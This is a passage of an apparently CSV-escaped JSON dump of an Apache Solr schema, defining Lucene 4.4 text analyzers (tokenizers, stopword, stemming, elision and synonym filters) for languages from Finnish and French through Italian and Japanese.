ENE_44""},""className"":""org.apache.lucene.analysis.fa.PersianNormalizationFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_fa.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""}}},""similarity"":{}},""text_fi"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_fi.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Finnish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_fi.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Finnish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_fr"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_fr.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_fr.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""FrenchLightStemFilterFactory"":{""args"":{""class"":""solr.FrenchLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.fr.FrenchLightStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_fr.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_fr.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""FrenchLightStemFilterFactory"":{""args"":{""class"":""solr.FrenchLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.fr.FrenchLightStemFilterFactory""}}},""similarity"":{}},""text_ga"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_ga.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/hyphenations_ga.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""IrishLowerCaseFilterFactory"":{""args"":{""class"":""solr.IrishLowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ga.IrishLowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ga.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Irish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_ga.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/hyphenations_ga.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""IrishLowerCaseFilterFactory"":{""args"":{""class"":""solr.IrishLowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ga.IrishLowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ga.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Irish"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_general"":{""fields"":[""subject"",""includes"",""author"",""title"",""description"",""name"",""features"",""text"",""keywords"",""resourcename"",""url"",""content"",""category"",""manu"",""comments"",""attr_*"",""*_txt"",""*_t""],""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""StopFilterFactory"":{""args"":{""words"":""stopwords.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""StopFilterFactory"":{""args"":{""words"":""stopwords.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SynonymFilterFactory"":{""args"":{""class"":""solr.SynonymFilterFactory"",""expand"":""true"",""synonyms"":""synonyms.txt"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.synonym.SynonymFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""similarity"":{}},""text_general_rev"":{""fields"":[""text_rev""],""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""StopFilterFactory"":{""args"":{""words"":""stopwords.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""ReversedWildcardFilterFactory"":{""args"":{""maxFractionAsterisk"":""0.33"",""withOriginal"":""true"",""maxPosQuestion"":""2"",""class"":""solr.ReversedWildcardFilterFactory"",""maxPosAsterisk"":""3"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.solr.analysis.ReversedWildcardFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""SynonymFilterFactory"":{""args"":{""class"":""solr.SynonymFilterFactory"",""expand"":""true"",""synonyms"":""synonyms.txt"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.synonym.SynonymFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""stopwords.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""similarity"":{}},""text_gl"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_gl.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""GalicianStemFilterFactory"":{""args"":{""class"":""solr.GalicianStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.gl.GalicianStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_gl.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""GalicianStemFilterFactory"":{""args"":{""class"":""solr.GalicianStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.gl.GalicianStemFilterFactory""}}},""similarity"":{}},""text_hi"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""IndicNormalizationFilterFactory"":{""args"":{""class"":""solr.IndicNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.in.IndicNormalizationFilterFactory""},""HindiNormalizationFilterFactory"":{""args"":{""class"":""solr.HindiNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.hi.HindiNormalizationFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_hi.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""HindiStemFilterFactory"":{""args"":{""class"":""solr.HindiStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.hi.HindiStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""IndicNormalizationFilterFactory"":{""args"":{""class"":""solr.IndicNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.in.IndicNormalizationFilterFactory""},""HindiNormalizationFilterFactory"":{""args"":{""class"":""solr.HindiNormalizationFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.hi.HindiNormalizationFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_hi.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""HindiStemFilterFactory"":{""args"":{""class"":""solr.HindiStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.hi.HindiStemFilterFactory""}}},""similarity"":{}},""text_hu"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_hu.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Hungarian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_hu.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Hungarian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_hy"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_hy.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Armenian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_hy.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""SnowballPorterFilterFactory"":{""args"":{""class"":""solr.SnowballPorterFilterFactory"",""language"":""Armenian"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.snowball.SnowballPorterFilterFactory""}}},""similarity"":{}},""text_id"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_id.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""IndonesianStemFilterFactory"":{""args"":{""class"":""solr.IndonesianStemFilterFactory"",""stemDerivational"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.id.IndonesianStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_id.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""IndonesianStemFilterFactory"":{""args"":{""class"":""solr.IndonesianStemFilterFactory"",""stemDerivational"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.id.IndonesianStemFilterFactory""}}},""similarity"":{}},""text_it"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_it.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_it.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""ItalianLightStemFilterFactory"":{""args"":{""class"":""solr.ItalianLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.it.ItalianLightStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""ElisionFilterFactory"":{""args"":{""articles"":""lang/contractions_it.txt"",""class"":""solr.ElisionFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.util.ElisionFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_it.txt"",""class"":""solr.StopFilterFactory"",""format"":""snowball"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""ItalianLightStemFilterFactory"":{""args"":{""class"":""solr.ItalianLightStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.it.ItalianLightStemFilterFactory""}}},""similarity"":{}},""text_ja"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.ja.JapaneseTokenizerFactory"",""args"":{""class"":""solr.JapaneseTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44"",""mode"":""search""}},""filters"":{""JapaneseBaseFormFilterFactory"":{""args"":{""class"":""solr.JapaneseBaseFormFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ja.JapaneseBaseFormFilterFactory""},""JapanesePartOfSpeechStopFilterFactory"":{""args"":{""tags"":""lang/stoptags_ja.txt"",""class"":""solr.JapanesePartOfSpeechStopFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ja.JapanesePartOfSpeechStopFilterFactory""},""CJKWidthFilterFactory"":{""args"":{""class"":""solr.CJKWidthFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cjk.CJKWidthFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ja.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""JapaneseKatakanaStemFilterFactory"":{""args"":{""class"":""solr.JapaneseKatakanaStemFilterFactory"",""minimumLength"":""4"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ja.JapaneseKatakanaStemFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.ja.JapaneseTokenizerFactory"",""args"":{""class"":""solr.JapaneseTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44"",""mode"":""search""}},""filters"":{""JapaneseBaseFormFilterFactory"":{""args"":{""class"":""solr.JapaneseBaseFormFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ja.JapaneseBaseFormFilterFactory""},""JapanesePartOfSpeechStopFilterFactory"":{""args"":{""tags"":""lang/stoptags_ja.txt"",""class"":""solr.JapanesePartOfSpeechStopFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ja.JapanesePartOfSpeechStopFilterFactory""},""CJKWidthFilterFactory"":{""args"":{""class"":""solr.CJKWidthFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.cjk.CJKWidthFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_ja.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""JapaneseKatakanaStemFilterFactory"":{""args"":{""class"":""solr.JapaneseKatakanaStemFilterFactory"",""minimumLength"":""4"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.ja.JapaneseKatakanaStemFilterFactory""},""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""}}},""similarity"":{}},""text_lv"":{""fields"":null,""tokenized"":true,""className"":""org.apache.solr.schema.TextField"",""indexAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCENE_44""}},""filters"":{""LowerCaseFilterFactory"":{""args"":{""class"":""solr.LowerCaseFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.LowerCaseFilterFactory""},""StopFilterFactory"":{""args"":{""words"":""lang/stopwords_lv.txt"",""class"":""solr.StopFilterFactory"",""ignoreCase"":""true"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.core.StopFilterFactory""},""LatvianStemFilterFactory"":{""args"":{""class"":""solr.LatvianStemFilterFactory"",""luceneMatchVersion"":""LUCENE_44""},""className"":""org.apache.lucene.analysis.lv.LatvianStemFilterFactory""}}},""queryAnalyzer"":{""className"":""org.apache.solr.analysis.TokenizerChain"",""tokenizer"":{""className"":""org.apache.lucene.analysis.standard.StandardTokenizerFactory"",""args"":{""class"":""solr.StandardTokenizerFactory"",""luceneMatchVersion"":""LUCE